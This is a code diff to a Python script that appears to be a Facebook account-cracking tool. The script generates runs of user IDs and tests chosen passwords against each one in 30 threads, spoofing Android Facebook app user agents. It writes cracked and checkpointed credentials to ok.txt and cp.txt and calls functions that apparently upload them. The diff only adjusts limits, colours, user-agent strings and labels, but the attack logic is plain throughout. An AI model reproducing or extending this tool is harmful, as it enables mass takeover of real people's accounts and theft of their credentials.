@@ -145,8 +145,8 @@ class Main:
 		x = 111111111
 		xx = 999999999
 		idx = "100000"
-		limit = int(input("\033[0;96m [+] ENTER LIMIT \033[0;95m(10,00000 MAX): \033[0;97m"))
-		if (limit)>1000000:
+		limit = int(input("\033[0;96m [+] ENTER LIMIT \033[0;95m(60,0000 MAX): \033[0;97m"))
+		if (limit)>600000:
 			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(D))
 		try:
 			for n in range(limit):
@@ -156,13 +156,13 @@ class Main:
 			print("\033[0;92m [+] TOTAL ID -> \033[0;92m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(G,G,B,G))
-				print("%s EXAMPLE : %s123456,1234567,123456789"%(G,P))
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(P,G))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(G,B))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,P))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(D))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(P))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(B))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(D))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -173,7 +173,7 @@ class Main:
 	def api(self, uid, pwx):
 		ua = random.choice([
 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
-			"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
+			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36;"
 			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]",
 			"Mozilla/5.0 (Linux; Android 9; Infinix X652A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36"
 		])
@@ -200,9 +200,9 @@ class Main:
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;94m[RNL-CP] %s | %s\033[0;94m"%                 (uid, pw))
+				print("\r \033[0;92m[RNL-OK] %s | %s\033[0;92m"%                 (uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write("[RNL-CP] %s | %s\n"%(uid, pw))
+				open("cp.txt","a").write("[RNL-OK] %s | %s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
